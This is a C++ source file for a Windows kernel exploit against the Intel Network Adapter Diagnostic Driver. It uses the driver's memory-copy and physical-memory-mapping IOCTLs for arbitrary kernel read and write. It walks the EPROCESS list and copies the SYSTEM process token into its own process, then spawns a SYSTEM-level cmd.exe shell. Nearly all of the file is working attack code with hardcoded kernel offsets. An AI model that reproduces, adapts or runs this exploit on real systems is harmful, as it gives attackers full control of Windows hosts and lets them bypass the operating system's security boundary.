#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <ntstatus.h>
#include <conio.h>
#include <iostream>

#include <tlhelp32.h>


#include <string>
#include <filesystem>
#include <atlstr.h>

#include <assert.h>

#pragma comment(lib, "ntdll.lib")

#include "intelExplo.hpp"


#define SystemModuleInformation ((SYSTEM_INFORMATION_CLASS)11)

const int64_t ExAPWTSignature = 0xd9a29e8ff973df71;

//HELPER STRUCTS/FUNCTIONS
void printBuff(int num, BYTE buff[])
{
	int i;
	for (i = 0; i < num; i++)
	{
		if (i > 0) printf(":");
		printf("%02X", buff[i]);
	}
	printf("\n");
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

BOOLEAN GetModuleBaseAddress(PCHAR Name, ULONG_PTR* lpBaseAddress) {
	PRTL_PROCESS_MODULES ModuleInformation = NULL;
	ULONG InformationSize = 16;
	NTSTATUS NtStatus;

	do {
		InformationSize *= 2;

		ModuleInformation = (PRTL_PROCESS_MODULES)realloc(ModuleInformation, InformationSize);
		memset(ModuleInformation, 0, InformationSize);

		NtStatus = NtQuerySystemInformation(SystemModuleInformation,
			ModuleInformation,
			InformationSize,
			NULL);
	} while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);

	if (!NT_SUCCESS(NtStatus)) {
		return FALSE;
	}

	BOOL Success = FALSE;
	for (UINT i = 0; i < ModuleInformation->NumberOfModules; i++) {
		CONST PRTL_PROCESS_MODULE_INFORMATION Module = &ModuleInformation->Modules[i];
		CONST USHORT OffsetToFileName = Module->OffsetToFileName;

		if (!strcmp((const char*)&Module->FullPathName[OffsetToFileName], Name)) {
			*lpBaseAddress = (ULONG_PTR)ModuleInformation->Modules[i].ImageBase;
			Success = TRUE;
			break;
		}
	}

	free(ModuleInformation);
	return Success;
}

uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name)
{
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!intel::KernelMemCpy(device_handle, (uint64_t)&dos_header, kernel_module_base, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!intel::KernelMemCpy(device_handle, (uint64_t)&nt_headers, kernel_module_base + dos_header.e_lfanew, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
	{
		return 0;
	}

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;


	if (!export_base || !export_base_size)
	{
		return 0;
	}

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!intel::KernelMemCpy(device_handle, (uint64_t)export_data, kernel_module_base + export_base, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i)
	{
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str()))
		{
			const auto function_ordinal = ordinal_table[i];
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size)

			{
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

uint64_t locateFunc(HANDLE hDevice, uint64_t modBase, uint64_t signature, uint64_t size)
{
	uint64_t tmp = 0;
	uint64_t hash = 0;
	uint64_t addr = 0;
	uint64_t pe = 0;
	intel::KernelMemCpy(hDevice, (uint64_t)&pe, (modBase + 0x3C), 4);
	
	uint64_t codeBase = 0;
	intel::KernelMemCpy(hDevice, (uint64_t)&codeBase, (modBase + pe + 0x2C), 4);

	codeBase += modBase;

	uint64_t codeSize = 0;
	intel::KernelMemCpy(hDevice, (uint64_t)&codeSize, (modBase + pe + 0x1C), 4);

	if (size != 0) 
	{
		codeSize = size;
	}

	PBYTE pointer = (PBYTE)VirtualAlloc(0, codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memset(pointer, 0, codeSize);

	intel::KernelMemCpy(hDevice, (uint64_t)pointer, codeBase, codeSize);
	addr = codeBase;

	while (1)
	{
		hash = 0;
		for (DWORD i = 0; i < 6; i++) 
		{
			tmp = *(PULONG64)((uint64_t)pointer + i * 4);
			hash += tmp;
		}
		if (hash == signature) 
		{
			break;
		}
		addr++;
		pointer = pointer + 1;
		if ((codeBase + codeSize) < addr) 
		{
			printf("Couldn't find function signature: %llx\n", signature);
			return 0;
		}
	}
	return addr;
}
//////////////////////////////////////////////////////////////////////////////////////////////////

// Get EPROCESS for System process
ULONG64 PsInitialSystemProcess()
{
	// load ntoskrnl.exe
	ULONG64 ntos = (ULONG64)LoadLibrary(L"ntoskrnl.exe");
	// get address of exported PsInitialSystemProcess variable
	ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	ULONG64 res = 0;
	ULONG_PTR Nt_addr = 0;
	GetModuleBaseAddress((PCHAR)"ntoskrnl.exe", &Nt_addr);
	// subtract addr from ntos to get PsInitialSystemProcess offset from base
	if (Nt_addr) {
		res = addr - ntos + Nt_addr;
	}
	return res;
}


typedef struct _VersionSpecificConfig
{
	DWORD UniqueProcessIdOffset;
	DWORD TokenOffset;
} VersionSpecificConfig;

VersionSpecificConfig gConfig;


// Get EPROCESS for current process
ULONG64 PsGetCurrentProcess(HANDLE hDevice, ULONG64 pEPROCESS)

/*
0: kd> dt nt!_EPROCESS UniqueProcessId
   +0x2e8 UniqueProcessId : Ptr64 Void
0: kd> dt nt!_EPROCESS ActiveProcessLinks
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
0: kd> dt nt!_EPROCESS Token
   +0x360 Token : _EX_FAST_REF
   */
{/*
	VersionSpecificConfig gConfig;

	//ActiveProcessId is UniqueProcessId+0x8
	gConfig.UniqueProcessIdOffset = 0x2e8;
	gConfig.TokenOffset = 0x360;
	*/
	// get System EPROCESS from param as pEPROCESS

	// walk ActiveProcessLinks until we find our Pid
	LIST_ENTRY ActiveProcessLinks;
	
	//ReadVirtual(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE*)&ActiveProcessLinks, sizeof(LIST_ENTRY));

	intel::KernelMemCpy(hDevice, (uint64_t)&ActiveProcessLinks, pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), sizeof(LIST_ENTRY));

	ULONG64 res = 0;

	while (TRUE) {
		ULONG64 UniqueProcessId = 0;

		// adjust EPROCESS pointer for next entry
		
		pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64);
		
		// get pid
		
		//ReadVirtual(pEPROCESS + gConfig.UniqueProcessIdOffset, (BYTE*)&UniqueProcessId, sizeof(ULONG64));

		intel::KernelMemCpy(hDevice, (uint64_t)&UniqueProcessId, pEPROCESS + gConfig.UniqueProcessIdOffset, sizeof(ULONG64));

		
		// is this our pid?
		if (GetCurrentProcessId() == UniqueProcessId) {
			res = pEPROCESS;
			break;
		}
		// get next entry
		
		//ReadVirtual(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE*)&ActiveProcessLinks, sizeof(LIST_ENTRY));

		intel::KernelMemCpy(hDevice, (uint64_t)&ActiveProcessLinks, pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), sizeof(LIST_ENTRY));
		
		// if next same as last, we reached the end
		if (pEPROCESS == (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64))
			break;
	}
	return res;
}

//////////////////////////////////////////////////////////////////////////////////////////////////



bool intel::SetMemory(HANDLE device_handle, uint64_t dest, uint64_t value, uint64_t len) 
{

	MEMSET_MEMORY_BUFFER memset_buffer = {};
	memset_buffer.switch_num = 0x30;
	memset_buffer.dest = dest;
	memset_buffer.value = value;
	memset_buffer.len = len;

	DWORD bret;
	return DeviceIoControl(device_handle, ioctl, &memset_buffer, sizeof(memset_buffer), NULL, 0, &bret, NULL);
}

bool intel::KernelMemCpy(HANDLE device_handle, uint64_t dest, uint64_t source, uint64_t count)
{

	MEMCPY_BUFFER memcpy_buffer = {};
	memcpy_buffer.switch_num = 0x32;
	memcpy_buffer.dest = dest;
	memcpy_buffer.source = source;
	memcpy_buffer.count = count;

	DWORD bret;
	return DeviceIoControl(device_handle, ioctl, &memcpy_buffer, sizeof(memcpy_buffer), NULL, 0, &bret, NULL);
}

uint64_t intel::GetPhysicalAddr(HANDLE device_handle, uint64_t virtualAddr)
{

	GETPHYSICAL_BUFFER getphysicalAddrBuff = {};
	getphysicalAddrBuff.switch_num = 0x25;
	getphysicalAddrBuff.virtualAddr = virtualAddr;
	getphysicalAddrBuff.physicalAddr = 0;

	DWORD bret;
	DeviceIoControl(device_handle, ioctl, &getphysicalAddrBuff, sizeof(getphysicalAddrBuff), NULL, 0, &bret, NULL);
	return getphysicalAddrBuff.physicalAddr;
}

uint64_t intel::MapIOSpace(HANDLE device_handle, uint64_t physicalAddr, uint64_t nBytes)
{

	MmapIOSpace_BUFFER mapIOSpaceBuff = {};
	mapIOSpaceBuff.switch_num = 0x19;
	mapIOSpaceBuff.physicalAddr = physicalAddr;
	mapIOSpaceBuff.nBytes = nBytes;

	DWORD bret;
	DeviceIoControl(device_handle, ioctl, &mapIOSpaceBuff, sizeof(mapIOSpaceBuff), NULL, 0, &bret, NULL);
	return mapIOSpaceBuff.returnedVirtualAddr;
}

bool intel::writeReadOnlyMemory(HANDLE device_handle, uint64_t dest, uint64_t source)
{
	uint64_t physicalAddr = 0;
	physicalAddr = intel::GetPhysicalAddr(device_handle, dest);
	if (!physicalAddr) 
	{
		printf("[-]Cannot get physical address of 0x%llx\n", dest);
		return false;
	}
	printf("[+]Physical address of 0x%llx: 0x%llx\n", dest, physicalAddr);

	uint64_t new_virtAddr = 0;

	new_virtAddr = intel::MapIOSpace(device_handle, physicalAddr, sizeof(source));

	if (!new_virtAddr)
	{
		printf("[-]Cannot map IO space!\n");
		return false;
	}

	printf("[+]Mapped new IO space at virtualAddr: 0x%llx\n", new_virtAddr);

	if (intel::KernelMemCpy(device_handle, new_virtAddr, source, sizeof(source))) 
	{
		return true;
	}
}

int main(int argc, char** argv)
{
	HANDLE   hDevice;
	DWORD    bret;

	gConfig.UniqueProcessIdOffset = 0x2e8;
	gConfig.TokenOffset = 0x360;


	printf("gConfig.Tokenoffset: 0x%x\n", gConfig.TokenOffset);
	printf("gConfig.UniqueProcessIdOffset: 0x%x\n", gConfig.UniqueProcessIdOffset);

	printf("--[ Intel Network Adapter Diagnostic Driver exploit ]--\n");

	printf("Opening handle to driver..\n");
	// CreateFile(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDispoition, dwFlagsAndAttributes, hTemplateFile)
	if ((hDevice = CreateFileA(intel::szDevice, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, NULL)) != INVALID_HANDLE_VALUE) {
		printf("Device %s succesfully opened!\n", intel::szDevice);
		printf("\tHandle: %p\n", hDevice);
	}
	else
	{
		printf("Error: Error opening device %s\n", intel::szDevice);
		return 0;
	}



	uint64_t Nt_physical = 0;

	ULONG_PTR Nt_addr = 0;
	ULONG_PTR Win32kfull_addr = 0;
	ULONG_PTR Win32kBase_addr = 0;


	printf("[+]Getting kernel module base addresses.\n");
	if (!GetModuleBaseAddress((PCHAR)"ntoskrnl.exe", &Nt_addr) || !GetModuleBaseAddress((PCHAR)"win32kbase.sys", &Win32kBase_addr) || !GetModuleBaseAddress((PCHAR)"win32kfull.sys", &Win32kfull_addr))
	{
		printf("[-]Unable to get kernel base addresses!\n");
		return -1;
	}
	printf("[+]Ntoskrnl addr: 0x%llx, Win32kBase address: 0x%llx, Win32k addr: 0x%llx\n", Nt_addr, Win32kBase_addr, Win32kfull_addr);

	
	
	ULONG64 ReadSystemEPROCESS = PsInitialSystemProcess();

	ULONG64 SystemEPROCESS = 0;

	//Read out pointer to PsInitialSystemProcess
	intel::KernelMemCpy(hDevice, (uint64_t)&SystemEPROCESS, (uint64_t)ReadSystemEPROCESS, 8);

	printf("[+]PsInitialSystemProcess pointer: 0x%llx\n", ReadSystemEPROCESS);
	printf("[+]PsInitialSystemProcess: 0x%llx\n", SystemEPROCESS);


	ULONG64 CurrentProcess = 0;

	CurrentProcess = PsGetCurrentProcess(hDevice, SystemEPROCESS);

	printf("[+]PsCurrentProcess: 0x%llx\n", CurrentProcess);


	ULONG64 SystemToken = 0;
	// read token from system process
	//ReadVirtual(SystemEPROCESS + gConfig.TokenOffset, (BYTE*)&SystemToken, sizeof(ULONG64));
	intel::KernelMemCpy(hDevice, (uint64_t)&SystemToken, SystemEPROCESS + 0x360, sizeof(LIST_ENTRY));
	printf("[+]SystemToken: 0x%llx\n", SystemToken);
	// write token to current process
	//WriteVirtual(CurrentEPROCESS + gConfig.TokenOffset, (BYTE*)&SystemToken, sizeof(ULONG64));
	intel::KernelMemCpy(hDevice, CurrentProcess + 0x360, (uint64_t)&SystemToken, sizeof(LIST_ENTRY));
	printf("[+]Writing SystemToken to current process...: 0x%llx\n", SystemToken);

	char username[0x100];

	DWORD ln = 0x100;
	GetUserName((LPWSTR)username, &ln);

	//printf("User: %s", username);

	system("cmd.exe");

	
	getchar();
	
	return 0;

	/*
	uint64_t tmp = 0;
	uint64_t hash = 0;

	uint64_t exAlloc = Nt_addr + 0x36f010;
	printf("[+]ExAllocatePoolWithTag addr: 0x%llx\n", exAlloc);

	PBYTE pointer = (PBYTE)VirtualAlloc(0, 24, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	intel::KernelMemCpy(hDevice, (uint64_t)pointer, exAlloc, 24);


	//printf("Pointer points to: %llx\n", (uint64_t)&pointer + i * 4);
	DWORD i = 0;


	//printf("[+]Pointer @ 0x%llx\n", *(PDWORD64)((uint64_t)pointer));


	for (i; i < 4; i++)
	{
	printf("Pointer points to: %llx\n", (uint64_t)&pointer + i * 4);
	tmp = *(PULONG64)((uint64_t)pointer + i * 4);
	printf("[+]Tmp: %llx\n", tmp);
	hash += tmp;
	printf("[+]Hash rn: %llx\n", hash);
	}
	printf("[+]Hash value at end: 0x%llx\n", hash);

	return 1;
	*/

	/*
	if (hash == signature)
	{
		printf("Got signature: %llx", );
	}
	addr++;
	pointer = pointer + 1;
	*/


}
